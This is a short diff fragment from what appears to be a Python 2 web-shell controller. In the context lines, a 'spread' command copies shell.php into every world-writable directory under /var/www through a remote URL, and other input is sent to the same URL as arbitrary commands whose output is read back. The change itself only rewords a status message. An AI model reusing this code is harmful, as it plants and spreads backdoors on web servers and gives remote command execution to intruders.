@@ -103,7 +103,7 @@ class Commander(object):
                     elif command == 'spread':
                         self.cmd = quote('find /var/www -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp shell.php')
                         urlopen('%s%s' % (self.url, self.cmd))
-                        print '[+] Successfully wrote %s to %d directory\n[+] Type writeable to check dirs' % (argv[0], len(self.writeables))
+                        print '[+] Successfully wrote shell.php to %d directory\n[+] Type writeable to check dirs' % len(self.writeables)
                     else:
                         source = urlopen('%s%s' % (self.url, command)).read()
                         if source:
